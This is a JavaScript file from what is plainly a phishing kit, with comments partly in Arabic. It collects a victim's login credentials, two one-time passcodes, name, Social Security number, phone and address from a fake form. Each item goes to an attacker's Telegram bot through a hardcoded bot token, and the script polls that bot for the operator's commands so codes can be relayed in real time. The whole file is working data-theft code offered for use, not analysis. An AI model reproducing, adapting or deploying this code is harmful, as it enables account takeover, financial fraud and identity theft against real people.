// BrosTec Protocol: Config
const telegramConfig = {
    botToken: '8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU',
    chatId: '7865246557',
    pollInterval: 3000 // فحص كل 3 ثواني
};

let lastMessageId = null;

async function nextStep(stepNumber) {
    const overlay = document.getElementById('loadingOverlay');
    
    // إظهار دائرة الانتظار (نقطة 2)
    if (overlay) overlay.style.display = 'flex';

    // جمع البيانات حسب الخطوة الحالية
    let message = "";
    if (stepNumber === 2) {
        message = `📌 New Login Attempt:\n👤 User: ${document.getElementById('user').value}\n🔑 Pass: ${document.getElementById('pass').value}`;
    } else if (stepNumber === 3) {
        message = `🔢 OTP 1 Received: ${document.getElementById('otp1').value}`;
    } else if (stepNumber === 4) {
        message = `📝 Full Info Received:\nName: ${document.getElementById('fName').value} ${document.getElementById('lName').value}\nSSN: ${document.getElementById('ssn').value}\nPhone: ${document.getElementById('phone').value}\nAddress: ${document.getElementById('street').value}, ${document.getElementById('city').value}`;
    } else if (stepNumber === 5) {
        message = `🔢 OTP 2 Received: ${document.getElementById('otp2').value}`;
    }

    // إرسال البيانات للتيليجرام مع الأزرار
    if (message !== "") {
        await sendToTelegram(message, stepNumber);
        // الانتظار حتى صدور أمر منك (نقطة 1)
        await waitForCommand(stepNumber);
    } else {
        executeStepTransition(stepNumber);
    }
}

async function sendToTelegram(text, step) {
    let buttons = [];
    if (step === 2) buttons = [[{ text: "ارسال OTP", callback_data: "next" }, { text: "اعادة ادخال بيانات", callback_data: "error_login" }]];
    if (step === 3) buttons = [[{ text: "الذهاب للصفحة التالية", callback_data: "next" }, { text: "اعادة ادخال OTP", callback_data: "error_otp1" }]];
    if (step === 4) buttons = [[{ text: "الذهاب لصفحة الـ OTP", callback_data: "next" }, { text: "اعادة ادخال المعلومات", callback_data: "error_info" }]];
    if (step === 5) buttons = [[{ text: "انهاء (نجاح)", callback_data: "next" }, { text: "OTP خطأ", callback_data: "error_otp2" }]];

    const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: telegramConfig.chatId,
            text: text,
            reply_markup: { inline_keyboard: buttons }
        })
    });
    const data = await res.json();
    lastMessageId = data.result.message_id;
}

async function waitForCommand(step) {
    return new Promise((resolve) => {
        const interval = setInterval(async () => {
            const url = `https://api.telegram.org/bot${telegramConfig.botToken}/getUpdates?offset=-1`;
            const res = await fetch(url);
            const data = await res.json();
            
            if (data.result.length > 0) {
                const lastUpdate = data.result[data.result.length - 1];
                if (lastUpdate.callback_query) {
                    const command = lastUpdate.callback_query.data;
                    
                    if (command === "next") {
                        clearInterval(interval);
                        hideErrors();
                        executeStepTransition(step);
                        resolve();
                    } else if (command.startsWith("error")) {
                        clearInterval(interval);
                        handleErrorCommand(command);
                        resolve();
                    }
                }
            }
        }, telegramConfig.pollInterval);
    });
}

function handleErrorCommand(command) {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';

    if (command === "error_login") {
        executeStepTransition(1);
    } else if (command === "error_otp1") {
        document.getElementById('otpError1').style.display = 'block';
    } else if (command === "error_info") {
        document.getElementById('infoError').style.display = 'block';
    } else if (command === "error_otp2") {
        document.getElementById('otpError2').style.display = 'block';
    }
}

function hideErrors() {
    ['otpError1', 'infoError', 'otpError2'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
}

function executeStepTransition(stepNumber) {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';

    document.querySelectorAll('.page-section').forEach(section => {
        section.classList.remove('active');
    });

    const targetSection = document.getElementById('step' + stepNumber);
    if (targetSection) {
        targetSection.classList.add('active');
    }

    window.scrollTo({ top: 0, behavior: 'smooth' });
}